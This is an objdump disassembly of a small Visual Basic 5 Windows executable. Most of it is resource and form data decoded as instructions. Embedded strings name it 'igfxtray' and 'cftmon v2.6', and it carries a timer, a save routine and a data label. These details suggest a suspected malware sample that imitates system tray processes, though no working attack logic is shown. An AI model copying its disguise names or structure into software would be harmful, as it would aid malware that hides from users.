  401729:	00 0f                	add    %cl,(%edi)
  40172b:	fc                   	cld
  40172c:	00 00                	add    %al,(%eax)
  40172e:	0f fc 00             	paddb  (%eax),%mm0
  401731:	00 0f                	add    %cl,(%edi)
  401733:	fc                   	cld
  401734:	00 00                	add    %al,(%eax)
  401736:	0f fc 00             	paddb  (%eax),%mm0
  401739:	00 0f                	add    %cl,(%edi)
  40173b:	fc                   	cld
  40173c:	00 00                	add    %al,(%eax)
  40173e:	0f fc 00             	paddb  (%eax),%mm0
  401741:	00 0f                	add    %cl,(%edi)
  401743:	fc                   	cld
  401744:	00 00                	add    %al,(%eax)
  401746:	0f fc 00             	paddb  (%eax),%mm0
  401749:	00 0f                	add    %cl,(%edi)
  40174b:	fc                   	cld
  40174c:	00 00                	add    %al,(%eax)
  40174e:	0f fe 00             	paddd  (%eax),%mm0
  401751:	00 0f                	add    %cl,(%edi)
  401753:	ff 00                	incl   (%eax)
  401755:	00 0f                	add    %cl,(%edi)
  401757:	ff 80 00 1f 28 00    	incl   0x281f00(%eax)
  40175d:	00 00                	add    %al,(%eax)
  40175f:	10 00                	adc    %al,(%eax)
  401761:	00 00                	add    %al,(%eax)
  401763:	20 00                	and    %al,(%eax)
  401765:	00 00                	add    %al,(%eax)
  401767:	01 00                	add    %eax,(%eax)
  401769:	04 00                	add    $0x0,%al
  40176b:	00 00                	add    %al,(%eax)
  40176d:	00 00                	add    %al,(%eax)
  40176f:	c0 00 00             	rolb   $0x0,(%eax)
	...
  401786:	00 00                	add    %al,(%eax)
  401788:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  40178e:	00 00                	add    %al,(%eax)
  401790:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  401797:	80 00 80             	addb   $0x80,(%eax)
  40179a:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  4017a0:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  4017a7:	00 00                	add    %al,(%eax)
  4017a9:	ff 00                	incl   (%eax)
  4017ab:	00 ff                	add    %bh,%bh
  4017ad:	00 00                	add    %al,(%eax)
  4017af:	00 ff                	add    %bh,%bh
  4017b1:	ff 00                	incl   (%eax)
  4017b3:	ff 00                	incl   (%eax)
  4017b5:	00 00                	add    %al,(%eax)
  4017b7:	ff 00                	incl   (%eax)
  4017b9:	ff 00                	incl   (%eax)
  4017bb:	ff                   	(bad)
  4017bc:	ff 00                	incl   (%eax)
  4017be:	00 ff                	add    %bh,%bh
  4017c0:	ff                   	(bad)
  4017c1:	ff 00                	incl   (%eax)
	...
  4017d3:	07                   	pop    %es
  4017d4:	ff                   	(bad)
  4017d5:	ff                   	(bad)
  4017d6:	ff                   	(bad)
  4017d7:	ff                   	(bad)
  4017d8:	ff 80 00 00 70 80    	incl   -0x7f900000(%eax)
  4017de:	80 80 80 80 00 00 07 	addb   $0x7,0x8080(%eax)
  4017e5:	07                   	pop    %es
  4017e6:	07                   	pop    %es
  4017e7:	07                   	pop    %es
  4017e8:	07                   	pop    %es
  4017e9:	07                   	pop    %es
  4017ea:	70 00                	jo     0x4017ec
  4017ec:	07                   	pop    %es
  4017ed:	88 88 88 88 78 70    	mov    %cl,0x70788888(%eax)
  4017f3:	00 00                	add    %al,(%eax)
  4017f5:	70 00                	jo     0x4017f7
  4017f7:	00 00                	add    %al,(%eax)
  4017f9:	07                   	pop    %es
  4017fa:	80 00 00             	addb   $0x0,(%eax)
  4017fd:	7f 88                	jg     0x401787
  4017ff:	88 88 70 77 00 00    	mov    %cl,0x7770(%eax)
  401805:	7f 07                	jg     0x40180e
  401807:	77 78                	ja     0x401881
  401809:	77 00                	ja     0x40180b
  40180b:	00 00                	add    %al,(%eax)
  40180d:	7f 06                	jg     0x401815
  40180f:	66 78 77             	data16 js 0x401889
  401812:	00 00                	add    %al,(%eax)
  401814:	00 7f 0e             	add    %bh,0xe(%edi)
  401817:	66 78 77             	data16 js 0x401891
  40181a:	00 00                	add    %al,(%eax)
  40181c:	00 7f 00             	add    %bh,0x0(%edi)
  40181f:	00 08                	add    %cl,(%eax)
  401821:	77 00                	ja     0x401823
  401823:	00 00                	add    %al,(%eax)
  401825:	7f ff                	jg     0x401826
  401827:	ff                   	(bad)
  401828:	f8                   	clc
  401829:	77 00                	ja     0x40182b
  40182b:	00 00                	add    %al,(%eax)
  40182d:	07                   	pop    %es
  40182e:	88 88 88 87 00 00    	mov    %cl,0x8788(%eax)
  401834:	00 00                	add    %al,(%eax)
  401836:	77 77                	ja     0x4018af
  401838:	77 77                	ja     0x4018b1
	...
  401842:	00 ff                	add    %bh,%bh
  401844:	ff 00                	incl   (%eax)
  401846:	00 80 07 00 00 80    	add    %al,-0x7ffffff9(%eax)
  40184c:	03 00                	add    (%eax),%eax
  40184e:	00 c0                	add    %al,%al
  401850:	01 00                	add    %eax,(%eax)
  401852:	00 e0                	add    %ah,%al
  401854:	00 00                	add    %al,(%eax)
  401856:	00 e0                	add    %ah,%al
  401858:	00 00                	add    %al,(%eax)
  40185a:	00 f0                	add    %dh,%al
  40185c:	00 00                	add    %al,(%eax)
  40185e:	00 f0                	add    %dh,%al
  401860:	00 00                	add    %al,(%eax)
  401862:	00 f0                	add    %dh,%al
  401864:	01 00                	add    %eax,(%eax)
  401866:	00 f0                	add    %dh,%al
  401868:	01 00                	add    %eax,(%eax)
  40186a:	00 f0                	add    %dh,%al
  40186c:	01 00                	add    %eax,(%eax)
  40186e:	00 f0                	add    %dh,%al
  401870:	01 00                	add    %eax,(%eax)
  401872:	00 f0                	add    %dh,%al
  401874:	01 00                	add    %eax,(%eax)
  401876:	00 f8                	add    %bh,%al
  401878:	01 00                	add    %eax,(%eax)
  40187a:	00 fc                	add    %bh,%ah
  40187c:	03 00                	add    (%eax),%eax
  40187e:	00 ff                	add    %bh,%bh
  401880:	ff 00                	incl   (%eax)
  401882:	00 24 05 00 46 6f 72 	add    %ah,0x726f4600(,%eax,1)
  401889:	6d                   	insl   (%dx),%es:(%edi)
  40188a:	31 00                	xor    %eax,(%eax)
  40188c:	26 00 2e             	add    %ch,%es:(%esi)
  40188f:	00 35 2d 00 00 00    	add    %dh,0x2d
  401895:	b3 01                	mov    $0x1,%bl
  401897:	00 00                	add    %al,(%eax)
  401899:	56                   	push   %esi
  40189a:	13 00                	adc    (%eax),%eax
  40189c:	00 15 09 00 00 46    	add    %dl,0x46000009
  4018a2:	02 ff                	add    %bh,%bh
  4018a4:	01 33                	add    %esi,(%ebx)
  4018a6:	00 00                	add    %al,(%eax)
  4018a8:	00 01                	add    %al,(%ecx)
  4018aa:	05 00 54 65 78       	add    $0x78655400,%eax
  4018af:	74 32                	je     0x4018e3
  4018b1:	00 02                	add    %al,(%edx)
  4018b3:	04 3c                	add    $0x3c,%al
  4018b5:	00 fc                	add    %bh,%ah
  4018b7:	03 cf                	add    %edi,%ecx
  4018b9:	12 bf 04 12 02 00    	adc    0x21204(%edi),%bh
  4018bf:	17                   	pop    %ss
  4018c0:	ff 18                	lcall  *(%eax)
  4018c2:	02 2d ff 2e 01 00    	add    0x12eff,%ch
  4018c8:	00 00                	add    %al,(%eax)
  4018ca:	90                   	nop
  4018cb:	01 90 5f 01 00 06    	add    %edx,0x600015f(%eax)
  4018d1:	54                   	push   %esp
  4018d2:	61                   	popa
  4018d3:	68 6f 6d 61 ff       	push   $0xff616d6f
  4018d8:	03 1f                	add    (%edi),%ebx
  4018da:	00 00                	add    %al,(%eax)
  4018dc:	00 02                	add    %al,(%edx)
  4018de:	06                   	push   %es
  4018df:	00 74 5f 73          	add    %dh,0x73(%edi,%ebx,2)
  4018e3:	61                   	popa
  4018e4:	76 65                	jbe    0x40194b
  4018e6:	00 0b                	add    %cl,(%ebx)
  4018e8:	03 60 ea             	add    -0x16(%eax),%esp
  4018eb:	00 00                	add    %al,(%eax)
  4018ed:	07                   	pop    %es
  4018ee:	78 00                	js     0x4018f0
  4018f0:	00 00                	add    %al,(%eax)
  4018f2:	08 b4 00 00 00 ff 03 	or     %dh,0x3ff0000(%eax,%eax,1)
  4018f9:	1f                   	pop    %ds
  4018fa:	00 00                	add    %al,(%eax)
  4018fc:	00 03                	add    %al,(%ebx)
  4018fe:	06                   	push   %es
  4018ff:	00 54 69 6d          	add    %dl,0x6d(%ecx,%ebp,2)
  401903:	65 72 31             	gs jb  0x401937
  401906:	00 0b                	add    %cl,(%ebx)
  401908:	03 01                	add    (%ecx),%eax
  40190a:	00 00                	add    %al,(%eax)
  40190c:	00 07                	add    %al,(%edi)
  40190e:	1c 02                	sbb    $0x2,%al
  401910:	00 00                	add    %al,(%eax)
  401912:	08 b4 00 00 00 ff 03 	or     %dh,0x3ff0000(%eax,%eax,1)
  401919:	33 00                	xor    (%eax),%eax
  40191b:	00 00                	add    %al,(%eax)
  40191d:	04 05                	add    $0x5,%al
  40191f:	00 54 65 78          	add    %dl,0x78(%ebp,%eiz,2)
  401923:	74 31                	je     0x401956
  401925:	00 02                	add    %al,(%edx)
  401927:	04 3c                	add    $0x3c,%al
  401929:	00 78 00             	add    %bh,0x0(%eax)
  40192c:	cf                   	iret
  40192d:	12 57 03             	adc    0x3(%edi),%dl
  401930:	12 00                	adc    (%eax),%al
  401932:	00 17                	add    %dl,(%edi)
  401934:	ff 18                	lcall  *(%eax)
  401936:	02 2d ff 2e 01 00    	add    0x12eff,%ch
  40193c:	00 00                	add    %al,(%eax)
  40193e:	90                   	nop
  40193f:	01 90 5f 01 00 06    	add    %edx,0x600015f(%eax)
  401945:	54                   	push   %esp
  401946:	61                   	popa
  401947:	68 6f 6d 61 ff       	push   $0xff616d6f
  40194c:	03 36                	add    (%esi),%esi
  40194e:	00 00                	add    %al,(%eax)
  401950:	00 05 07 00 6c 62    	add    %al,0x626c0007
  401956:	6c                   	insb   (%dx),%es:(%edi)
  401957:	44                   	inc    %esp
  401958:	61                   	popa
  401959:	74 61                	je     0x4019bc
  40195b:	00 01                	add    %al,(%ecx)
  40195d:	04 ff                	add    $0xff,%al
  40195f:	ff                   	(bad)
  401960:	ff 00                	incl   (%eax)
  401962:	05 3c 00 24 09       	add    $0x924003c,%eax
  401967:	cf                   	iret
  401968:	12 77 01             	adc    0x1(%edi),%dh
  40196b:	12 01                	adc    (%ecx),%al
  40196d:	00 1f                	add    %bl,(%edi)
  40196f:	00 25 01 00 00 00    	add    %ah,0x1
  401975:	90                   	nop
  401976:	01 90 5f 01 00 06    	add    %edx,0x600015f(%eax)
  40197c:	54                   	push   %esp
  40197d:	61                   	popa
  40197e:	68 6f 6d 61 ff       	push   $0xff616d6f
  401983:	02 04 00             	add    (%eax,%eax,1),%al
  401986:	00 00                	add    %al,(%eax)
  401988:	01 00                	add    %eax,(%eax)
  40198a:	00 00                	add    %al,(%eax)
  40198c:	30 21                	xor    %ah,(%ecx)
  40198e:	40                   	inc    %eax
  40198f:	00 00                	add    %al,(%eax)
  401991:	00 00                	add    %al,(%eax)
  401993:	00 ff                	add    %bh,%bh
  401995:	ff                   	(bad)
  401996:	ff                   	(bad)
  401997:	ff                   	(bad)
  401998:	ff                   	(bad)
  401999:	ff                   	(bad)
  40199a:	ff                   	(bad)
  40199b:	ff 00                	incl   (%eax)
  40199d:	00 00                	add    %al,(%eax)
  40199f:	00 84 21 40 00 08 80 	add    %al,-0x7ff7ffc0(%ecx,%eiz,1)
  4019a6:	40                   	inc    %eax
  4019a7:	00 00                	add    %al,(%eax)
  4019a9:	00 00                	add    %al,(%eax)
  4019ab:	00 60 49             	add    %ah,0x49(%eax)
  4019ae:	b9 04 00 00 00       	mov    $0x4,%ecx
	...
  4019bb:	00 c0                	add    %al,%al
  4019bd:	19 40 00             	sbb    %eax,0x0(%eax)
  4019c0:	06                   	push   %es
  4019c1:	00 00                	add    %al,(%eax)
  4019c3:	00 90 2f 40 00 07    	add    %dl,0x700402f(%eax)
  4019c9:	00 00                	add    %al,(%eax)
  4019cb:	00 ec                	add    %ch,%ah
  4019cd:	29 40 00             	sub    %eax,0x0(%eax)
  4019d0:	07                   	pop    %es
  4019d1:	00 00                	add    %al,(%eax)
  4019d3:	00 a4 29 40 00 07 00 	add    %ah,0x70040(%ecx,%ebp,1)
  4019da:	00 00                	add    %al,(%eax)
  4019dc:	58                   	pop    %eax
  4019dd:	29 40 00             	sub    %eax,0x0(%eax)
  4019e0:	07                   	pop    %es
  4019e1:	00 00                	add    %al,(%eax)
  4019e3:	00 00                	add    %al,(%eax)
  4019e5:	29 40 00             	sub    %eax,0x0(%eax)
  4019e8:	07                   	pop    %es
  4019e9:	00 00                	add    %al,(%eax)
  4019eb:	00 b4 28 40 00 07 00 	add    %dh,0x70040(%eax,%ebp,1)
  4019f2:	00 00                	add    %al,(%eax)
  4019f4:	68 28 40 00 07       	push   $0x7004028
  4019f9:	00 00                	add    %al,(%eax)
  4019fb:	00 f4                	add    %dh,%ah
  4019fd:	27                   	daa
  4019fe:	40                   	inc    %eax
  4019ff:	00 07                	add    %al,(%edi)
  401a01:	00 00                	add    %al,(%eax)
  401a03:	00 a8 27 40 00 50    	add    %ch,0x50004027(%eax)
  401a09:	00 00                	add    %al,(%eax)
  401a0b:	00 88 40 7c 88 fe    	add    %cl,-0x17783c0(%eax)
  401a11:	20 03                	and    %al,(%ebx)
  401a13:	40                   	inc    %eax
  401a14:	a9 f4 c5 00 e8       	test   $0xe800c5f4,%eax
  401a19:	d3 47 e4             	roll   %cl,-0x1c(%edi)
	...
  401a2c:	01 00                	add    %eax,(%eax)
  401a2e:	00 00                	add    %al,(%eax)
  401a30:	90                   	nop
  401a31:	02 00                	add    (%eax),%al
	...
  401a47:	00 cd                	add    %cl,%ch
  401a49:	05 00 00 00 00       	add    $0x0,%eax
  401a4e:	00 00                	add    %al,(%eax)
  401a50:	b8 13 40 00 4c       	mov    $0x4c004013,%eax
  401a55:	00 00                	add    %al,(%eax)
  401a57:	00 56 42             	add    %dl,0x42(%esi)
  401a5a:	35 21 f0 1f 2a       	xor    $0x2a1ff021,%eax
	...
  401a6b:	00 7e 00             	add    %bh,0x0(%esi)
	...
  401a7a:	0a 00                	or     (%eax),%al
  401a7c:	10 04 00             	adc    %al,(%eax,%eax,1)
	...
  401a87:	00 f0                	add    %dh,%al
  401a89:	1a 40 00             	sbb    0x0(%eax),%al
  401a8c:	06                   	push   %es
  401a8d:	f8                   	clc
  401a8e:	30 00                	xor    %al,(%eax)
  401a90:	00 ff                	add    %bh,%bh
  401a92:	ff                   	(bad)
  401a93:	ff 08                	decl   (%eax)
  401a95:	00 00                	add    %al,(%eax)
  401a97:	00 01                	add    %al,(%ecx)
  401a99:	00 00                	add    %al,(%eax)
  401a9b:	00 01                	add    %al,(%ecx)
  401a9d:	00 00                	add    %al,(%eax)
  401a9f:	00 e9                	add    %ch,%cl
  401aa1:	00 00                	add    %al,(%eax)
  401aa3:	00 08                	add    %cl,(%eax)
  401aa5:	1a 40 00             	sbb    0x0(%eax),%al
  401aa8:	88 19                	mov    %bl,(%ecx)
  401aaa:	40                   	inc    %eax
  401aab:	00 64 13 40          	add    %ah,0x40(%ebx,%edx,1)
  401aaf:	00 78 00             	add    %bh,0x0(%eax)
  401ab2:	00 00                	add    %al,(%eax)
  401ab4:	81 00 00 00 8d 00    	addl   $0x8d0000,(%eax)
  401aba:	00 00                	add    %al,(%eax)
  401abc:	8e 00                	mov    (%eax),%es
	...
  401ace:	00 00                	add    %al,(%eax)
  401ad0:	69 67 66 78 74 72 61 	imul   $0x61727478,0x66(%edi),%esp
  401ad7:	79 00                	jns    0x401ad9
  401ad9:	63 66 74             	arpl   %esp,0x74(%esi)
  401adc:	6d                   	insl   (%dx),%es:(%edi)
  401add:	6f                   	outsl  %ds:(%esi),(%dx)
  401ade:	6e                   	outsb  %ds:(%esi),(%dx)
  401adf:	20 76 32             	and    %dh,0x32(%esi)
  401ae2:	2e 36 00 00          	cs add %al,%ss:(%eax)
  401ae6:	69 67 66 78 74 72 61 	imul   $0x61727478,0x66(%edi),%esp
  401aed:	79 00                	jns    0x401aef
  401aef:	00 f4                	add    %dh,%ah
  401af1:	01 00                	add    %eax,(%eax)
  401af3:	00 30                	add    %dh,(%eax)
  401af5:	21 40 00             	and    %eax,0x0(%eax)
  401af8:	00 00                	add    %al,(%eax)
  401afa:	00 00                	add    %al,(%eax)
  401afc:	a0 30 40 00 70       	mov    0x70004030,%al
  401b01:	77 40                	ja     0x401b43
  401b03:	00 f4                	add    %dh,%ah
  401b05:	0a 00                	or     (%eax),%al
  401b07:	00 08                	add    %cl,(%eax)
  401b09:	80 40 00 c6          	addb   $0xc6,0x0(%eax)
  401b0d:	11 40 00             	adc    %eax,0x0(%eax)
  401b10:	00 80 40 00 2a 00    	add    %al,0x2a0040(%eax)
  401b16:	5c                   	pop    %esp
  401b17:	00 41 00             	add    %al,0x0(%ecx)
  401b1a:	43                   	inc    %ebx
  401b1b:	00 3a                	add    %bh,(%edx)
  401b1d:	00 5c 00 55          	add    %bl,0x55(%eax,%eax,1)
  401b21:	00 73 00             	add    %dh,0x0(%ebx)
  401b24:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  401b28:	73 00                	jae    0x401b2a
  401b2a:	5c                   	pop    %esp
  401b2b:	00 56 00             	add    %dl,0x0(%esi)
  401b2e:	4d                   	dec    %ebp
  401b2f:	00 5c 00 44          	add    %bl,0x44(%eax,%eax,1)
  401b33:	00 65 00             	add    %ah,0x0(%ebp)
  401b36:	73 00                	jae    0x401b38
  401b38:	6b 00 74             	imul   $0x74,(%eax),%eax
  401b3b:	00 6f 00             	add    %ch,0x0(%edi)
  401b3e:	70 00                	jo     0x401b40
  401b40:	5c                   	pop    %esp
  401b41:	00 62 00             	add    %ah,0x0(%edx)
  401b44:	6d                   	insl   (%dx),%es:(%edi)
  401b45:	00 39                	add    %bh,(%ecx)
  401b47:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  401b4b:	00 47 00             	add    %al,0x0(%edi)
  401b4e:	5a                   	pop    %edx
  401b4f:	00 6a 00             	add    %ch,0x0(%edx)
  401b52:	43                   	inc    %ebx
  401b53:	00 67 00             	add    %ah,0x0(%edi)
  401b56:	5c                   	pop    %esp
  401b57:	00 62 00             	add    %ah,0x0(%edx)
  401b5a:	6d                   	insl   (%dx),%es:(%edi)
  401b5b:	00 39                	add    %bh,(%ecx)
  401b5d:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  401b61:	00 47 00             	add    %al,0x0(%edi)
  401b64:	5a                   	pop    %edx
  401b65:	00 6a 00             	add    %ch,0x0(%edx)
  401b68:	43                   	inc    %ebx
  401b69:	00 67 00             	add    %ah,0x0(%edi)
  401b6c:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  401b70:	62 00                	bound  %eax,(%eax)
  401b72:	70 00                	jo     0x401b74
	...
  401d24:	c0 19 40             	rcrb   $0x40,(%ecx)
  401d27:	00 09                	add    %cl,(%ecx)
  401d29:	00 00                	add    %al,(%eax)
  401d2b:	00 01                	add    %al,(%ecx)
  401d2d:	00 01                	add    %al,(%ecx)
  401d2f:	00 30                	add    %dh,(%eax)
  401d31:	21 40 00             	and    %eax,0x0(%eax)
  401d34:	00 00                	add    %al,(%eax)
  401d36:	00 00                	add    %al,(%eax)
  401d38:	f4                   	hlt
  401d39:	2f                   	das
  401d3a:	40                   	inc    %eax
  401d3b:	00 ff                	add    %bh,%bh
  401d3d:	ff                   	(bad)
  401d3e:	ff                   	(bad)
  401d3f:	ff 00                	incl   (%eax)
  401d41:	00 00                	add    %al,(%eax)
  401d43:	00 b4 21 40 00 50 80 	add    %dh,-0x7fafffc0(%ecx,%eiz,1)
  401d4a:	40                   	inc    %eax
  401d4b:	00 08                	add    %cl,(%eax)
  401d4d:	00 00                	add    %al,(%eax)
  401d4f:	00 a4 1d 40 00 00 00 	add    %ah,0x40(%ebp,%ebx,1)
	...
  401d5e:	00 00                	add    %al,(%eax)
  401d60:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401d61:	1d 40 00 01 00       	sbb    $0x10040,%eax
  401d66:	00 00                	add    %al,(%eax)
  401d68:	90                   	nop
  401d69:	26 40                	es inc %eax
  401d6b:	00 00                	add    %al,(%eax)
  401d6d:	00 00                	add    %al,(%eax)
  401d6f:	00 c4                	add    %al,%ah
  401d71:	1d 40 00 01 00       	sbb    $0x10040,%eax
  401d76:	00 00                	add    %al,(%eax)
  401d78:	cc                   	int3
  401d79:	1d 40 00 00 00       	sbb    $0x40,%eax
  401d7e:	00 00                	add    %al,(%eax)
  401d80:	c8 1d 40 00          	enter  $0x401d,$0x0
  401d84:	06                   	push   %es
  401d85:	00 00                	add    %al,(%eax)
  401d87:	00 cc                	add    %cl,%ah
  401d89:	1d 40 00 05 00       	sbb    $0x50040,%eax
  401d8e:	b7 01                	mov    $0x1,%bh
  401d90:	68 00 6c 00 bc       	push   $0xbc006c00
  401d95:	1e                   	push   %ds
  401d96:	40                   	inc    %eax
  401d97:	00 e4                	add    %ah,%ah
  401d99:	83 40 00 00          	addl   $0x0,0x0(%eax)
  401d9d:	00 00                	add    %al,(%eax)
  401d9f:	00 b8 67 bf 04 28    	add    %bh,0x2804bf67(%eax)
  401da5:	e2 5a                	loop   0x401e01
  401da7:	05 00 00 0d 00       	add    $0xd0000,%eax
	...
  401dbc:	30 78 bf             	xor    %bh,-0x41(%eax)
  401dbf:	04 00                	add    $0x0,%al
  401dc1:	00 09                	add    %cl,(%ecx)
  401dc3:	00 a0 26 40 00 e8    	add    %ah,-0x17ffbfda(%eax)
  401dc9:	24 40                	and    $0x40,%al
  401dcb:	00 40 00             	add    %al,0x0(%eax)
  401dce:	18 00                	sbb    %al,(%eax)
  401dd0:	3c 00                	cmp    $0x0,%al
  401dd2:	00 00                	add    %al,(%eax)
  401dd4:	f8                   	clc
  401dd5:	24 40                	and    $0x40,%al
  401dd7:	00 04 00             	add    %al,(%eax,%eax,1)
  401dda:	03 00                	add    (%eax),%eax
	...
  401de4:	d0 1e                	rcrb   $1,(%esi)
  401de6:	40                   	inc    %eax
  401de7:	00 64 e7 39          	add    %ah,0x39(%edi,%eiz,8)
  401deb:	00 08                	add    %cl,(%eax)
  401ded:	25 40 00 04 00       	and    $0x40040,%eax
  401df2:	03 00                	add    (%eax),%eax
  401df4:	40                   	inc    %eax
  401df5:	00 18                	add    %bl,(%eax)
  401df7:	00 40 00             	add    %al,0x0(%eax)
  401dfa:	00 00                	add    %al,(%eax)
  401dfc:	f8                   	clc
  401dfd:	24 40                	and    $0x40,%al
  401dff:	00 01                	add    %al,(%ecx)
  401e01:	00 03                	add    %al,(%ebx)
	...
  401e0b:	00 48 1f             	add    %cl,0x1f(%eax)
  401e0e:	40                   	inc    %eax
  401e0f:	00 64 e7 39          	add    %ah,0x39(%edi,%eiz,8)
  401e13:	00 30                	add    %dh,(%eax)
  401e15:	27                   	daa
  401e16:	40                   	inc    %eax
  401e17:	00 01                	add    %al,(%ecx)
  401e19:	00 03                	add    %al,(%ebx)
  401e1b:	00 40 00             	add    %al,0x0(%eax)
  401e1e:	1f                   	pop    %ds
  401e1f:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  401e23:	00 38                	add    %bh,(%eax)
  401e25:	27                   	daa
  401e26:	40                   	inc    %eax
  401e27:	00 ff                	add    %bh,%bh
  401e29:	ff                   	(bad)
  401e2a:	ff                   	(bad)
  401e2b:	ff 00                	incl   (%eax)
  401e2d:	00 00                	add    %al,(%eax)
  401e2f:	00 00                	add    %al,(%eax)
  401e31:	00 00                	add    %al,(%eax)
  401e33:	00 c0                	add    %al,%al
  401e35:	1f                   	pop    %ds
  401e36:	40                   	inc    %eax
  401e37:	00 74 e7 39          	add    %dh,0x39(%edi,%eiz,8)
  401e3b:	00 48 27             	add    %cl,0x27(%eax)
  401e3e:	40                   	inc    %eax
  401e3f:	00 ff                	add    %bh,%bh
  401e41:	ff                   	(bad)
  401e42:	ff                   	(bad)
  401e43:	ff 40 00             	incl   0x0(%eax)
  401e46:	12 00                	adc    (%eax),%al
  401e48:	48                   	dec    %eax
  401e49:	00 00                	add    %al,(%eax)
  401e4b:	00 50 27             	add    %dl,0x27(%eax)
  401e4e:	40                   	inc    %eax
  401e4f:	00 05 00 03 00 00    	add    %al,0x300
  401e55:	00 00                	add    %al,(%eax)
  401e57:	00 00                	add    %al,(%eax)
  401e59:	00 00                	add    %al,(%eax)
  401e5b:	00 54 20 40          	add    %dl,0x40(%eax,%eiz,1)
  401e5f:	00 84 e7 39 00 60 27 	add    %al,0x27600039(%edi,%eiz,8)
  401e66:	40                   	inc    %eax
  401e67:	00 05 00 03 00 40    	add    %al,0x40000300
  401e6d:	00 01                	add    %al,(%ecx)
  401e6f:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  401e73:	00 68 27             	add    %ch,0x27(%eax)
  401e76:	40                   	inc    %eax
  401e77:	00 03                	add    %al,(%ebx)
  401e79:	00 03                	add    %al,(%ebx)
	...
  401e83:	00 b4 20 40 00 94 e7 	add    %dh,-0x186bffc0(%eax,%eiz,1)
  401e8a:	39 00                	cmp    %eax,(%eax)
  401e8c:	78 27                	js     0x401eb5
  401e8e:	40                   	inc    %eax
  401e8f:	00 03                	add    %al,(%ebx)
  401e91:	00 03                	add    %al,(%ebx)
  401e93:	00 40 00             	add    %al,0x0(%eax)
  401e96:	01 00                	add    %eax,(%eax)
  401e98:	50                   	push   %eax
  401e99:	00 00                	add    %al,(%eax)
  401e9b:	00 68 27             	add    %ch,0x27(%eax)
  401e9e:	40                   	inc    %eax
  401e9f:	00 02                	add    %al,(%edx)
  401ea1:	00 03                	add    %al,(%ebx)
	...
  401eab:	00 d0                	add    %dl,%al
  401ead:	20 40 00             	and    %al,0x0(%eax)
  401eb0:	94                   	xchg   %eax,%esp
  401eb1:	e7 39                	out    %eax,$0x39
  401eb3:	00 80 27 40 00 02    	add    %al,0x2004027(%eax)
  401eb9:	00 03                	add    %al,(%ebx)
  401ebb:	00 f4                	add    %dh,%ah
  401ebd:	20 40 00             	and    %al,0x0(%eax)
  401ec0:	01 21                	add    %esp,(%ecx)
  401ec2:	40                   	inc    %eax
  401ec3:	00 0e                	add    %cl,(%esi)
  401ec5:	21 40 00             	and    %eax,0x0(%eax)
  401ec8:	1b 21                	sbb    (%ecx),%esp
  401eca:	40                   	inc    %eax
  401ecb:	00 28                	add    %ch,(%eax)
  401ecd:	21 40 00             	and    %eax,0x0(%eax)
  401ed0:	00 00                	add    %al,(%eax)
  401ed2:	00 00                	add    %al,(%eax)
  401ed4:	cc                   	int3
  401ed5:	1d 40 00 2c 1d       	sbb    $0x1d2c0040,%eax
  401eda:	40                   	inc    %eax
  401edb:	00 40 13             	add    %al,0x13(%eax)
  401ede:	40                   	inc    %eax
  401edf:	00 46 13             	add    %al,0x13(%esi)
  401ee2:	40                   	inc    %eax
  401ee3:	00 4c 13 40          	add    %cl,0x40(%ebx,%edx,1)
  401ee7:	00 06                	add    %al,(%esi)
  401ee9:	21 40 00             	and    %eax,0x0(%eax)
	...
  401f4c:	f4                   	hlt
  401f4d:	1d 40 00 2c 1d       	sbb    $0x1d2c0040,%eax
  401f52:	40                   	inc    %eax
  401f53:	00 40 13             	add    %al,0x13(%eax)
  401f56:	40                   	inc    %eax
  401f57:	00 46 13             	add    %al,0x13(%esi)
  401f5a:	40                   	inc    %eax
  401f5b:	00 4c 13 40          	add    %cl,0x40(%ebx,%edx,1)
  401f5f:	00 13                	add    %dl,(%ebx)
  401f61:	21 40 00             	and    %eax,0x0(%eax)
	...
  401fc4:	1c 1e                	sbb    $0x1e,%al
  401fc6:	40                   	inc    %eax
  401fc7:	00 2c 1d 40 00 40 13 	add    %ch,0x13400040(,%ebx,1)
  401fce:	40                   	inc    %eax
  401fcf:	00 46 13             	add    %al,0x13(%esi)
  401fd2:	40                   	inc    %eax
  401fd3:	00 4c 13 40          	add    %cl,0x40(%ebx,%edx,1)
	...
  401fef:	00 ec                	add    %ch,%ah
  401ff1:	20 40 00             	and    %al,0x0(%eax)
	...
  402058:	44                   	inc    %esp
  402059:	1e                   	push   %ds
  40205a:	40                   	inc    %eax
  40205b:	00 2c 1d 40 00 40 13 	add    %ch,0x13400040(,%ebx,1)
  402062:	40                   	inc    %eax
  402063:	00 46 13             	add    %al,0x13(%esi)
  402066:	40                   	inc    %eax
  402067:	00 4c 13 40          	add    %cl,0x40(%ebx,%edx,1)
	...
  4020b7:	00 6c 1e 40          	add    %ch,0x40(%esi,%ebx,1)
  4020bb:	00 2c 1d 40 00 40 13 	add    %ch,0x13400040(,%ebx,1)
  4020c2:	40                   	inc    %eax
  4020c3:	00 46 13             	add    %al,0x13(%esi)
  4020c6:	40                   	inc    %eax
  4020c7:	00 4c 13 40          	add    %cl,0x40(%ebx,%edx,1)
  4020cb:	00 20                	add    %ah,(%eax)
  4020cd:	21 40 00             	and    %eax,0x0(%eax)
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	94                   	xchg   %eax,%esp
  4020d5:	1e                   	push   %ds
  4020d6:	40                   	inc    %eax
  4020d7:	00 2c 1d 40 00 40 13 	add    %ch,0x13400040(,%ebx,1)
  4020de:	40                   	inc    %eax
  4020df:	00 46 13             	add    %al,0x13(%esi)
  4020e2:	40                   	inc    %eax
  4020e3:	00 4c 13 40          	add    %cl,0x40(%ebx,%edx,1)
  4020e7:	00 f9                	add    %bh,%cl
  4020e9:	20 40 00             	and    %al,0x0(%eax)
  4020ec:	81 6c 24 04 43 00 00 	subl   $0x43,0x4(%esp)
  4020f3:	00 
  4020f4:	e9 d7 1c 00 00       	jmp    0x403dd0
  4020f9:	81 6c 24 04 4f 00 00 	subl   $0x4f,0x4(%esp)
  402100:	00 
